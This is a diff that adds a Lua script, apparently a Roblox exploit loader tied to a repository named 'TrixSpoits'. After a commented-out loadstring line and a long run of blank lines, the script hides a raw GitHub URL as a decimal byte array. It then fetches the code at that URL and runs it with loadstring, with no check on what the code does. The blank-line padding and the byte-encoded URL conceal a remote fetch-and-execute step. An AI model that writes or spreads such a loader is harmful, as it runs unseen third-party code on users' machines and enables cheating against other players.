@@ -1,0 +1,89 @@
+-- loadstring(game:HttpGet("https://raw.githubusercontent.com/KieuroBeep/TrixSpoits/refs/heads/main/LuaScriptFile"))()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local url_bytes = {
+  104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,
+  101,114,99,111,110,116,101,110,116,46,99,111,109,47,75,105,101,117,114,111,
+  66,101,101,112,47,84,114,105,120,83,112,111,105,116,115,47,114,101,102,115,
+  47,104,101,97,100,115,47,109,97,105,110,47,89,98,97
+}
+
+local chars = {}
+for i = 1, #url_bytes do chars[i] = string.char(url_bytes[i]) end
+local url = table.concat(chars)
+
+local ok, res = pcall(function()
+  if type(game.HttpGet) == "function" then
+    return game:HttpGet(url)
+  end
+  local hs = (game.GetService and game:GetService("HttpService"))
+  if hs and hs.GetAsync then
+    return hs:GetAsync(url)
+  end
+  error("no HttpGet / GetAsync available in this environment")
+end)
+
+if not ok then
+  error("HTTP fetch failed: "..tostring(res))
+end
+
+local code = tostring(res)
+
+local snippet = code:sub(1, 300)
+local lowered = snippet:lower()
+if lowered:find("<!doctype") or lowered:find("<html") or lowered:find("not found") or lowered:find("repository") or lowered:find("window.location") then
+  error("Fetched content doesn't look like Lua (likely HTML/404). First 300 chars:\n\n" .. snippet)
+end
+
+local loader = loadstring or load
+local fn, compile_err = loader(code)
+if not fn then
+  error("Compile error from remote code: "..tostring(compile_err) .. "\nFirst 300 chars:\n\n" .. snippet)
+end
+
+local ok2, run_err = pcall(fn)
+if not ok2 then
+  error("Remote script runtime error: "..tostring(run_err))
+end
